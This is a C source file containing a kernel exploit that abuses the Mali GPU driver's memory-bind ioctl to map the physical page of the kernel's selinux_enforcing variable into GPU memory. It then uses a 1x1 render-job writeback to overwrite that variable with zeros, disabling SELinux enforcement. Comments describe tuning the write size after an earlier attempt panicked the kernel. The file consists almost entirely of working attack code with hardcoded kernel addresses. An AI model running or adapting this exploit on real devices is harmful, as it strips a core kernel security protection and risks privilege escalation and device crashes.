/*
 * kort_selinux_1x1.c - Try to disable SELinux with 1x1 frame (smaller write)
 *
 * 16x16 frame = 1024 bytes write caused kernel panic.
 * 1x1 frame with R8 format = only 136 bytes.
 * Maybe 136 bytes won't crash the kernel.
 *
 * selinux_enforcing: phys=0x02a394ec, page=0x02a39000, inpage=0x4ec
 * WB_ADDRESS 8-byte aligned -> write starts at 0x4e8
 * selinux_enforcing is at offset 0x4ec = write_base + 4
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <errno.h>
#include <signal.h>

/* ==================== CONSTANTS ==================== */

#define KERNEL_PHYS_BASE        0x01080000u
#define SELINUX_ENFORCING_RVA   0x19B94ECu
#define SELINUX_ENFORCING_PHYS  (KERNEL_PHYS_BASE + SELINUX_ENFORCING_RVA)
#define SELINUX_ENFORCING_PAGE  (SELINUX_ENFORCING_PHYS & ~0xFFFu)
#define SELINUX_ENFORCING_INPAGE (SELINUX_ENFORCING_PHYS & 0xFFFu)

#define GPU_VA_TGT  0x40000000u
#define GPU_VA_DATA 0x40300000u
#define DATA_SIZE   0x4000

/* ==================== MALI IOCTL ==================== */

#define MALI_IOC_MEM_ALLOC      0xC0288300u
#define MALI_IOC_MEM_BIND       0xC0288302u
#define MALI_IOC_PP_START_JOB   0xC1988400u
#define MALI_IOC_WAIT_FOR_NOTIFICATION 0xC0688202u
#define _MALI_MEMORY_BIND_BACKEND_EXTERNAL_MEMORY (1 << 11)
#define _MALI_NOTIFICATION_PP_FINISHED ((2 << 16) | 0x10)

typedef struct {
    uint64_t ctx; uint32_t gpu_vaddr; uint32_t vsize; uint32_t psize;
    uint32_t flags; uint64_t backend_handle; int32_t secure_shared_fd;
} mali_uk_alloc_mem_s;

typedef struct {
    uint64_t ctx; uint32_t vaddr; uint32_t size; uint32_t flags;
    uint32_t padding; uint32_t phys_addr; uint32_t rights;
    uint32_t bind_flags; uint32_t pad2;
} mali_uk_bind_mem_s;

#define MALI_UK_TIMELINE_MAX 3
typedef struct { uint32_t points[MALI_UK_TIMELINE_MAX]; int32_t sync_fd; } mali_uk_fence_t;

typedef struct {
    uint64_t ctx; uint64_t user_job_ptr; uint32_t priority;
    uint32_t frame_registers[23];
    uint32_t frame_registers_addr_frame[7];
    uint32_t frame_registers_addr_stack[7];
    uint32_t wb0_registers[12]; uint32_t wb1_registers[12]; uint32_t wb2_registers[12];
    uint32_t dlbu_registers[4];
    uint32_t num_cores; uint32_t perf_counter_flag;
    uint32_t perf_counter_src0; uint32_t perf_counter_src1;
    uint32_t frame_builder_id; uint32_t flush_id; uint32_t flags;
    uint32_t tilesx; uint32_t tilesy; uint32_t heatmap_mem;
    uint32_t num_memory_cookies; uint64_t memory_cookies;
    mali_uk_fence_t fence; uint64_t timeline_point_ptr;
} mali_uk_pp_start_job_s;

typedef struct {
    uint64_t ctx; uint32_t type; uint32_t _pad; uint8_t data[88];
} mali_uk_wait_for_notification_s;

#define FR_PLBU_ARRAY_ADDR 0
#define FR_RENDER_ADDR     1
#define FR_FLAGS           3
#define FR_CLEAR_COLOR_0   6
#define FR_CLEAR_COLOR_1   7
#define FR_CLEAR_COLOR_2   8
#define FR_CLEAR_COLOR_3   9
#define FR_WIDTH          10
#define FR_HEIGHT         11
#define FR_FRAG_STACK_ADDR 12
#define FR_FRAG_STACK_SIZE 13

#define WB_TYPE         0
#define WB_ADDRESS      1
#define WB_PIXEL_FORMAT 2
#define WB_DOWNSAMPLE   3
#define WB_PIXEL_LAYOUT 4
#define WB_PITCH        5
#define WB_TARGET_FLAGS 6
#define WB_MRT_ENABLE   7

static int fd = -1;
static void *data_buf = NULL;
static volatile int g_to = 0;
static void alarm_handler(int s) { (void)s; g_to = 1; }

static int tio(unsigned int cmd, void *buf, int timeout) {
    alarm(timeout); g_to = 0;
    int r = ioctl(fd, cmd, buf);
    int e = errno;
    alarm(0);
    if (g_to) return -999;
    return r == 0 ? 0 : -e;
}

/*
 * Write to target using 1x1 frame with specified pixel format.
 * clear_color is ARGB format.
 * Returns 0 on success.
 */
static int wb_write(uint32_t tgt_offset, uint32_t clear_color, uint32_t pixfmt)
{
    uint8_t *buf = (uint8_t *)data_buf;
    memset(buf, 0, 0x1000);  /* only clear job area */

    /* Empty tile block at 0x200 */
    memset(buf + 0x200, 0, 64);

    /* Minimal fragment shader */
    static const uint32_t shader[] = {
        0x00020425, 0x0000000c, 0x01e007cf, 0xb0000000, 0x000005f5,
    };
    memcpy(buf + 0x080, shader, sizeof(shader));

    /* FIXED PLB (no B0) */
    uint32_t *plb = (uint32_t *)buf;
    uint32_t tileblk_gpu = GPU_VA_DATA + 0x200;
    plb[0] = 0x00000000;
    plb[1] = 0xB8000000;
    plb[2] = 0xE0000002 | ((tileblk_gpu >> 3) & ~0xE0000003u);
    plb[3] = 0xBC000000;

    /* RSW at 0x100 */
    uint32_t *rsw = (uint32_t *)(buf + 0x100);
    rsw[0x08] = 0x0000F008;
    rsw[0x09] = (GPU_VA_DATA + 0x080) | 5;
    rsw[0x0D] = 0x00000100;

    uint32_t wb_addr = GPU_VA_TGT + tgt_offset;

    mali_uk_pp_start_job_s job;
    memset(&job, 0, sizeof(job));
    job.user_job_ptr = 0xDEADBEEFCAFEBABEULL;
    job.num_cores = 1;

    job.frame_registers[FR_PLBU_ARRAY_ADDR] = GPU_VA_DATA + 0x000;
    job.frame_registers[FR_RENDER_ADDR]     = GPU_VA_DATA + 0x100;
    job.frame_registers[FR_FLAGS]           = 0x01;
    job.frame_registers[FR_CLEAR_COLOR_0]   = clear_color;
    job.frame_registers[FR_CLEAR_COLOR_1]   = clear_color;
    job.frame_registers[FR_CLEAR_COLOR_2]   = clear_color;
    job.frame_registers[FR_CLEAR_COLOR_3]   = clear_color;
    job.frame_registers[FR_WIDTH]           = 1;
    job.frame_registers[FR_HEIGHT]          = 1;
    job.frame_registers[FR_FRAG_STACK_ADDR] = GPU_VA_DATA + 0x1000;
    job.frame_registers[FR_FRAG_STACK_SIZE] = 0x400;

    job.wb0_registers[WB_TYPE]         = 0x02;
    job.wb0_registers[WB_ADDRESS]      = wb_addr;
    job.wb0_registers[WB_PIXEL_FORMAT] = pixfmt;
    job.wb0_registers[WB_DOWNSAMPLE]   = 0;
    job.wb0_registers[WB_PIXEL_LAYOUT] = 0;
    job.wb0_registers[WB_PITCH]        = 1;
    job.wb0_registers[WB_TARGET_FLAGS] = 0;
    job.wb0_registers[WB_MRT_ENABLE]   = 0;

    job.fence.sync_fd = -1;
    uint32_t tl = 0;
    job.timeline_point_ptr = (uint64_t)(uintptr_t)&tl;

    __builtin___clear_cache((char *)buf, (char *)buf + DATA_SIZE);

    int ret = tio(MALI_IOC_PP_START_JOB, &job, 5);
    if (ret == -999) return -999;
    if (ret != 0) return ret;

    mali_uk_wait_for_notification_s notif;
    memset(&notif, 0, sizeof(notif));
    ret = tio(MALI_IOC_WAIT_FOR_NOTIFICATION, &notif, 5);
    if (ret == -999) return -999;
    if (ret != 0) return ret;

    uint32_t status;
    memcpy(&status, notif.data + 8, 4);
    if (!(status & (1 << 16))) return -1;
    return 0;
}

int main(int argc, char **argv)
{
    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = alarm_handler;
    sigaction(SIGALRM, &sa, NULL);
    setvbuf(stdout, NULL, _IONBF, 0);

    printf("=== SELinux Disable Test (1x1 small write) ===\n\n");

    /* Choose format: 0x04=R8 (136 bytes, smallest), 0x03=RGBA8888 (184 bytes) */
    uint32_t pixfmt = 0x04;  /* R8 - smallest write */
    const char *fmtname = "R8/136B";
    if (argc > 1 && strcmp(argv[1], "--rgba") == 0) {
        pixfmt = 0x03;
        fmtname = "RGBA8888/184B";
    }

    printf("selinux_enforcing: phys=0x%08x, page=0x%08x, offset=0x%x\n",
           SELINUX_ENFORCING_PHYS, SELINUX_ENFORCING_PAGE, SELINUX_ENFORCING_INPAGE);
    printf("format: %s\n", fmtname);
    printf("WB write starts at 8-byte aligned offset: 0x%x\n",
           SELINUX_ENFORCING_INPAGE & ~7u);
    printf("selinux_enforcing is at write offset +%d (4 bytes)\n\n",
           SELINUX_ENFORCING_INPAGE & 7);

    fd = open("/dev/mali", O_RDWR);
    if (fd < 0) { perror("open /dev/mali"); return 1; }
    printf("[+] opened /dev/mali\n");

    /* ALLOC_MEM for job data */
    mali_uk_alloc_mem_s alloc;
    memset(&alloc, 0, sizeof(alloc));
    alloc.gpu_vaddr = GPU_VA_DATA;
    alloc.vsize = DATA_SIZE;
    alloc.psize = DATA_SIZE;
    if (tio(MALI_IOC_MEM_ALLOC, &alloc, 3) != 0) {
        printf("[-] ALLOC_MEM failed\n"); return 1;
    }
    printf("[+] ALLOC_MEM OK\n");

    data_buf = mmap(NULL, DATA_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED, fd, GPU_VA_DATA);
    if (data_buf == MAP_FAILED) { perror("mmap"); return 1; }
    printf("[+] mmap OK\n");

    /* BIND selinux page */
    printf("\n[*] BIND selinux page 0x%08x -> GPU VA 0x%08x\n",
           SELINUX_ENFORCING_PAGE, GPU_VA_TGT);
    mali_uk_bind_mem_s bind;
    memset(&bind, 0, sizeof(bind));
    bind.vaddr = GPU_VA_TGT;
    bind.size = 0x1000;
    bind.flags = _MALI_MEMORY_BIND_BACKEND_EXTERNAL_MEMORY;
    bind.phys_addr = SELINUX_ENFORCING_PAGE;
    bind.rights = 0x37;
    if (tio(MALI_IOC_MEM_BIND, &bind, 3) != 0) {
        printf("[-] BIND failed\n"); return 1;
    }
    printf("[+] BIND OK\n");

    /*
     * Write 0 to selinux_enforcing.
     * For R8 format (fmt=0x04), all bytes = R channel value.
     * clear_color ARGB: R=bits23-16. So set R=0 to write 0 bytes.
     */
    uint32_t clear_color = 0x00000000;  /* R=0, G=0, B=0, A=0 */

    /*
     * Write at the 8-byte aligned base.
     * selinux_enforcing is at inpage offset 0x4ec.
     * 8-byte aligned base = 0x4e8.
     * selinux_enforcing = base + 4.
     *
     * For R8 format: all bytes = R value from clear_color.
     * So writing at 0x4e8 will set 136 bytes to R=0.
     * selinux_enforcing (at offset 4 within write) will be 0x00000000.
     */
    uint32_t write_offset = SELINUX_ENFORCING_INPAGE & ~7u;

    printf("[*] WB write 0 to offset 0x%x (selinux_enforcing at +0x%x)\n",
           write_offset, SELINUX_ENFORCING_INPAGE & 7);

    int rc = wb_write(write_offset, clear_color, pixfmt);
    if (rc == -999) {
        printf("[-] WB TIMEOUT / HUNG!\n");
        return 1;
    }
    if (rc != 0) {
        printf("[-] WB FAILED (rc=%d)\n", rc);
        return 1;
    }
    printf("[+] WB WRITE OK\n");

    printf("\n[*] If device is still alive, SELinux might be disabled!\n");
    printf("[*] Checking getenforce in 2 seconds...\n");
    sleep(2);

    /* Try to read selinux status */
    int pfd = open("/proc/sys/fs/selinux/enforce", O_RDONLY);
    if (pfd >= 0) {
        char buf[16] = {0};
        int n = read(pfd, buf, sizeof(buf)-1);
        close(pfd);
        printf("[+] /proc/sys/fs/selinux/enforce = %s", buf);
    } else {
        printf("[-] Cannot read /proc/sys/fs/selinux/enforce: %s\n", strerror(errno));
    }

    /* Also try getenforce via shell command output */
    /* We can't run getenforce here easily, but user can check manually */

    munmap(data_buf, DATA_SIZE);
    close(fd);

    printf("\n[*] Done. If device didn't reboot, SELinux may be Permissive.\n");
    printf("[*] Run: adb shell getenforce\n");
    return 0;
}
